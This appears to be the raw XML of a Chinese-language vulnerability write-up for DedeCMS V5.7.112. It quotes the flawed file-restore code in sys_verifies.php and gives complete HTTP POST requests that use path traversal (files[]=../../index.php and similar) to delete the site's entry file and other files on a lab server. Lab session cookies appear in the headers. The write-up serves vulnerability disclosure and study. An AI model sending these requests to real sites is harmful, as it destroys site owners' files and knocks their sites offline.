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Dedecms最新版网站拒绝服务攻击&amp;&amp;任意文件删除</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="gpTNr" w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
        </w:rPr>
        <w:t>源码归属</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="0"/>
    <w:bookmarkStart w:name="u8e6d4783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dedecms 属于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="false"/>
          <w:i w:val="false"/>
          <w:color w:val="6c757d"/>
          <w:sz w:val="24"/>
          <w:shd w:fill="f8f9fa"/>
        </w:rPr>
        <w:t>上海卓卓网络科技有限公司</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="1"/>
    <w:bookmarkStart w:name="uef241d73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公司官网 </w:t>
      </w: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https://www.dedecms.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="2"/>
    <w:bookmarkStart w:name="u572f4e65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源码下载 </w:t>
      </w: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https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.112-UTF8.zip</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:bookmarkEnd w:id="3"/>
    <w:bookmarkStart w:name="ufd7812e5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icon_hash="-47597126"</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="4"/>
    <w:bookmarkStart w:name="u788a48a5" w:id="5"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ufd97b3e5" w:id="6"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="201531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04666" cy="26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bookmarkEnd w:id="5"/>
    <w:bookmarkStart w:name="EGskO" w:id="7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代码审计</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="7"/>
    <w:bookmarkStart w:name="u2f24198b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代码所处文件名：sys_verifies.php</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="8"/>
    <w:bookmarkStart w:name="QE86k" w:id="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else if ($action == 'apply')</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $cacheFiles = DEDEDATA.'/modifytmp.inc';</w:t>
        <w:br/>
        <w:t xml:space="preserve">    require_once($cacheFiles);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $sDir = DEDEDATA."/$tmpdir";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $tDir = DEDEROOT;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">    $badcp = 0;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));</w:t>
        <w:br/>
        <w:t xml:space="preserve">        </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if(isset($files) &amp;&amp; is_array($files))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        foreach($files as $f)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            if(preg_match("#^dede#", $f)) $tf = preg_replace("#^dede#", $adminDir, $f);</w:t>
        <w:br/>
        <w:t xml:space="preserve">            else $tf = $f;</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">            if(file_exists($sDir.'/'.$f))</w:t>
        <w:br/>
        <w:t xml:space="preserve">            {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                //还原文件前先进行文件校验</w:t>
        <w:br/>
        <w:t xml:space="preserve">                $ct = file_get_contents($sDir.'/'.$f);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                $ct = preg_replace("/\/\*\*[\r\n]{1,}(.*)[\r\n]{1,} \*\//sU", '', $ct);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                $newhash = md5($ct);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                $row = $dsql-&gt;GetOne("SELECT * FROM `#@__verifies` WHERE filename='../{$f}' ");</w:t>
        <w:br/>
        <w:t xml:space="preserve">                if(is_array($row) &amp;&amp; $row['cthash'] != $newhash)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    $badcp++;</w:t>
        <w:br/>
        <w:t xml:space="preserve">                } else {</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    $rs = @copy($sDir.'/'.$f, $tDir.'/'.$tf);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    if($rs) unlink($sDir.'/'.$f);</w:t>
        <w:br/>
        <w:t xml:space="preserve">                    else $badcp++;</w:t>
        <w:br/>
        <w:t xml:space="preserve">                }</w:t>
        <w:br/>
        <w:t xml:space="preserve">            }</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    $badmsg = '！';</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if($badcp &gt; 0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $badmsg = "，其 {$badcp} 个文件校验码不正确或复制失败，&lt;br /&gt;请从临时目录[../data/{$tmpdir}]中取出这几个文件手动还原。";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t xml:space="preserve">    ShowMsg("成功完成还原指定文件{$badmsg}", "javascript:;");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit();</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="9"/>
    <w:bookmarkStart w:name="u87921348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可以看到 只要文件存在 就会调用 以下代码 然后 rs为true的时候执行文件删除 可以配合目录穿越</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="10"/>
    <w:bookmarkStart w:name="epqbl" w:id="1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$rs = @copy($sDir.'/'.$f, $tDir.'/'.$tf);</w:t>
        <w:br/>
        <w:t>if($rs) unlink($sDir.'/'.$f);</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="11"/>
    <w:bookmarkStart w:name="u56d6c57a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这里有一个 require_once($cacheFiles); 要不让这段代码报错继续执行后续代码，还需要执行另外一个请求</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="12"/>
    <w:bookmarkStart w:name="hHvdk" w:id="1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POST /dede/sys_verifies.php HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.242.142</w:t>
        <w:br/>
        <w:t>Upgrade-Insecure-Requests: 1</w:t>
        <w:br/>
        <w:t>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</w:t>
        <w:br/>
        <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</w:t>
        <w:br/>
        <w:t>Referer: http://192.168.242.142/dede/action_search.php</w:t>
        <w:br/>
        <w:t>Accept-Encoding: gzip, deflate, br</w:t>
        <w:br/>
        <w:t>Accept-Language: zh-CN,zh;q=0.9</w:t>
        <w:br/>
        <w:t>Cookie: menuitems=1_1%2C2_1%2C3_1%2C6_1; uuid=1; WS_ADMIN_URL=ws://192.168.242.142:89/notice; WS_CHAT_URL=ws://192.168.242.142:89/msg; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIwZmQ0Yjc1ZTA2Nzc5MjMwOTdlZThlNmQzYTdkZTQwMSIsImlzcyI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImF1ZCI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImlhdCI6MTcwNjk3MzI2MCwibmJmIjoxNzA2OTczMjYwLCJleHAiOjE3MDk1NjUyNjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.-GYeO_DtNeIpiE8_ephhd6ju7LYuMaNYaSH-7k6_d2E; expires_time=1709565260; PHPSESSID=hje88fq2t1623asrn9067ed7sn; _csrf_name_c27ad341=78a0334576fa96f1f974a70641c3ed9a; _csrf_name_c27ad3411BH21ANI1AGD297L1FF21LN02BGE1DNG=8c0862bd51089cc9; ENV_GOBACK_URL=%2Fdede%2Fmember_main.php%3Fkeyword%3D%26sortkey%3Dmid%26sex%3D%26mtype%3D%26spacesta%3D-10%26imageField.x%3D50%26imageField.y%3D12; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0d9e5878a4073894; DedeLoginTime=1707044783; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=5535c73ba45d1a01</w:t>
        <w:br/>
        <w:t>Connection: close</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:t>Content-Length: 46</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>action=getfiles&amp;refiles=http://127.0.0.1/1.php</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="13"/>
    <w:bookmarkStart w:name="u8e9c90b5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refiles合理即可</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="14"/>
    <w:bookmarkStart w:name="s6Er6" w:id="15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漏洞复现</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="15"/>
    <w:bookmarkStart w:name="ue4878a42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首先调用上午数据包然后 就可以进行删除index.php了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="16"/>
    <w:bookmarkStart w:name="u4abafe8e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首先没有删除之前是这样的 index.php可以正常访问</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="17"/>
    <w:bookmarkStart w:name="u196b8904" w:id="18"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u670e45e9" w:id="19"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="345834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75334" cy="59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bookmarkEnd w:id="18"/>
    <w:bookmarkStart w:name="ucf753995" w:id="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然后进行网站拒绝服务攻击</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="20"/>
    <w:bookmarkStart w:name="uffe02d3d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删除此文件</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="21"/>
    <w:bookmarkStart w:name="u7296b89e" w:id="22"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u2dfa6622" w:id="23"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5841999" cy="303161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bookmarkEnd w:id="22"/>
    <w:bookmarkStart w:name="uacff2a1b" w:id="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数据包如下</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="24"/>
    <w:bookmarkStart w:name="hg6lj" w:id="2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POST /dede/sys_verifies.php HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.242.142</w:t>
        <w:br/>
        <w:t>Upgrade-Insecure-Requests: 1</w:t>
        <w:br/>
        <w:t>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</w:t>
        <w:br/>
        <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</w:t>
        <w:br/>
        <w:t>Referer: http://192.168.242.142/dede/action_search.php</w:t>
        <w:br/>
        <w:t>Accept-Encoding: gzip, deflate, br</w:t>
        <w:br/>
        <w:t>Accept-Language: zh-CN,zh;q=0.9</w:t>
        <w:br/>
        <w:t>Cookie: menuitems=1_1%2C2_1%2C3_1%2C6_1; uuid=1; WS_ADMIN_URL=ws://192.168.242.142:89/notice; WS_CHAT_URL=ws://192.168.242.142:89/msg; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIwZmQ0Yjc1ZTA2Nzc5MjMwOTdlZThlNmQzYTdkZTQwMSIsImlzcyI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImF1ZCI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImlhdCI6MTcwNjk3MzI2MCwibmJmIjoxNzA2OTczMjYwLCJleHAiOjE3MDk1NjUyNjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.-GYeO_DtNeIpiE8_ephhd6ju7LYuMaNYaSH-7k6_d2E; expires_time=1709565260; PHPSESSID=hje88fq2t1623asrn9067ed7sn; _csrf_name_c27ad341=78a0334576fa96f1f974a70641c3ed9a; _csrf_name_c27ad3411BH21ANI1AGD297L1FF21LN02BGE1DNG=8c0862bd51089cc9; ENV_GOBACK_URL=%2Fdede%2Fmember_main.php%3Fkeyword%3D%26sortkey%3Dmid%26sex%3D%26mtype%3D%26spacesta%3D-10%26imageField.x%3D50%26imageField.y%3D12; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0d9e5878a4073894; DedeLoginTime=1707044783; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=5535c73ba45d1a01</w:t>
        <w:br/>
        <w:t>Connection: close</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:t>Content-Length: 91</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>action=apply&amp;files[]=../../index.php</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="25"/>
    <w:bookmarkStart w:name="ub31a1382" w:id="26"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="udbd0ecad" w:id="27"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="177009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0" cy="337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bookmarkEnd w:id="26"/>
    <w:bookmarkStart w:name="u16d52927" w:id="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查看服务器发现文件不见了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="28"/>
    <w:bookmarkStart w:name="uc74de26d" w:id="29"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ud1d083fa" w:id="30"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5723466" cy="324992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466" cy="324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</w:p>
    <w:bookmarkEnd w:id="29"/>
    <w:bookmarkStart w:name="u2b428a2b" w:id="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再去访问主站 网站已经无法正常服务了因为路由入口文件已经被删除了</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="31"/>
    <w:bookmarkStart w:name="u1deae515" w:id="32"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="uf43b2f63" w:id="33"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5841999" cy="344644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68934" cy="570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bookmarkEnd w:id="32"/>
    <w:bookmarkStart w:name="u170496a9" w:id="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除了删除网站跟目录的文件以为还可以目录穿越删除其他文件</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="34"/>
    <w:bookmarkStart w:name="ubff4d69b" w:id="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例如删除这个1.txt文件</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="35"/>
    <w:bookmarkStart w:name="u8e031979" w:id="36"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u81bdc5fa" w:id="37"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5554134" cy="23321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4134" cy="23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7"/>
    </w:p>
    <w:bookmarkEnd w:id="36"/>
    <w:bookmarkStart w:name="uc7023033" w:id="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构造数据包</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="38"/>
    <w:bookmarkStart w:name="XGeAT" w:id="3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POST /dede/sys_verifies.php HTTP/1.1</w:t>
        <w:br/>
        <w:t>Host: 192.168.242.142</w:t>
        <w:br/>
        <w:t>Upgrade-Insecure-Requests: 1</w:t>
        <w:br/>
        <w:t>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</w:t>
        <w:br/>
        <w:t>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</w:t>
        <w:br/>
        <w:t>Referer: http://192.168.242.142/dede/action_search.php</w:t>
        <w:br/>
        <w:t>Accept-Encoding: gzip, deflate, br</w:t>
        <w:br/>
        <w:t>Accept-Language: zh-CN,zh;q=0.9</w:t>
        <w:br/>
        <w:t>Cookie: menuitems=1_1%2C2_1%2C3_1%2C6_1; uuid=1; WS_ADMIN_URL=ws://192.168.242.142:89/notice; WS_CHAT_URL=ws://192.168.242.142:89/msg; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIwZmQ0Yjc1ZTA2Nzc5MjMwOTdlZThlNmQzYTdkZTQwMSIsImlzcyI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImF1ZCI6IjE5Mi4xNjguMjQyLjE0Mjo4OSIsImlhdCI6MTcwNjk3MzI2MCwibmJmIjoxNzA2OTczMjYwLCJleHAiOjE3MDk1NjUyNjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.-GYeO_DtNeIpiE8_ephhd6ju7LYuMaNYaSH-7k6_d2E; expires_time=1709565260; PHPSESSID=hje88fq2t1623asrn9067ed7sn; _csrf_name_c27ad341=78a0334576fa96f1f974a70641c3ed9a; _csrf_name_c27ad3411BH21ANI1AGD297L1FF21LN02BGE1DNG=8c0862bd51089cc9; ENV_GOBACK_URL=%2Fdede%2Fmember_main.php%3Fkeyword%3D%26sortkey%3Dmid%26sex%3D%26mtype%3D%26spacesta%3D-10%26imageField.x%3D50%26imageField.y%3D12; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=0d9e5878a4073894; DedeLoginTime=1707044783; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=5535c73ba45d1a01</w:t>
        <w:br/>
        <w:t>Connection: close</w:t>
        <w:br/>
        <w:t>Content-Type: application/x-www-form-urlencoded</w:t>
        <w:br/>
        <w:t>Content-Length: 36</w:t>
        <w:br/>
        <w:t/>
        <w:br/>
        <w:t>action=apply&amp;files[]=../../../../1.txt</w:t>
        <w:br/>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="39"/>
    <w:bookmarkStart w:name="u901dbc7c" w:id="40"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="ucb8142eb" w:id="41"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="191018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09867" cy="366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1"/>
    </w:p>
    <w:bookmarkEnd w:id="40"/>
    <w:bookmarkStart w:name="u8b4765e5" w:id="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删除成功</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="42"/>
    <w:bookmarkStart w:name="u3b533541" w:id="43"/>
    <w:p>
      <w:pPr>
        <w:spacing w:after="50" w:line="360" w:lineRule="auto" w:beforeLines="100"/>
        <w:ind w:left="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:name="u8dab157d" w:id="44"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="宋体" w:ascii="宋体"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5842000" cy="172902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45866" cy="211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4"/>
    </w:p>
    <w:bookmarkEnd w:id="43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document_image_rId10.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId11" Target="media/document_image_rId11.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId12" Target="media/document_image_rId12.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId13" Target="media/document_image_rId13.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"/><Relationship Id="rId14" Target="media/document_image_rId14.png" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image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www.dedecms.com/" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"/><Relationship Id="rId5" Target="https://updatenew.dedecms.com/base-v57/package/DedeCMS-V5.7.112-UTF8.zip" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink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